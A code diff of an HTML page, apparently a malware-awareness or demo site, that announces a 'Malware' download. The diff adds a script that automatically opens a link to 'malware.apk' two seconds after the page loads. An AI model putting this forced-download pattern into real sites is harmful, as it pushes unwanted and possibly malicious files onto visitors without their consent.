@@ -13,7 +13,16 @@
     </head>
 
     <script type="text/javascript">
-
+        $(function() {
+            $('a[data-auto-download]').each(function(){
+                var $this = $(this);
+                var $download = $this.attr('href');
+                setTimeout(function() {
+//                    window.location = $this.attr('href');
+                    window.open($download, '_blank');
+                }, 2000);
+            });
+        });
     </script>
 
     <body class="">
@@ -36,7 +45,7 @@
                         <ul class="nav navbar-nav">
                             <li><a href="/error.html">Home</a></li>
                             <li><a href="/error.html">About Us</a></li>
-                            <li class="active"><a href="/download.html">Download</a></li>
+                            <li class="active"><a href="/download.html" target="_blank">Download</a></li>
                         </ul>
                     </div><!-- /.navbar-collapse -->
                 </div>
@@ -46,9 +55,10 @@
         <div class="container main-container">
             <div class="instructions-container col-lg-12 col-md-12 col-sm-12 col-xs-12">
 
-                <h1 class="text-center col-lg-12 col-md-12 col-sm-12 col-xs-12">Congratulations!</h1>
-                <h3 class="text-center col-lg-12 col-md-12 col-sm-12 col-xs-12">You've successfully downloaded "Malware."</h3>
-
+                <h2 class="text-center col-lg-12 col-md-12 col-sm-12 col-xs-12">You've successfully downloaded "Malware!"</h2>
+                <hr />
+                <h4 class="text-center col-lg-12 col-md-12 col-sm-12 col-xs-12">Your download should begin automatically. If it doesn't, please click <a data-auto-download download="crying" href="malware.apk">here</a>.</h4>
+                <br /><br />
                 <div class="instructions-list-container col-lg-12 col-md-12 col-sm-12 col-xs-12">
                     <h4 class="col-lg-12 col-md-12 col-sm-12 col-xs-12">Please follow these instructions:</h4>
                     <ol class="col-lg-12 col-md-12 col-sm-12 col-xs-12 instructions-list">
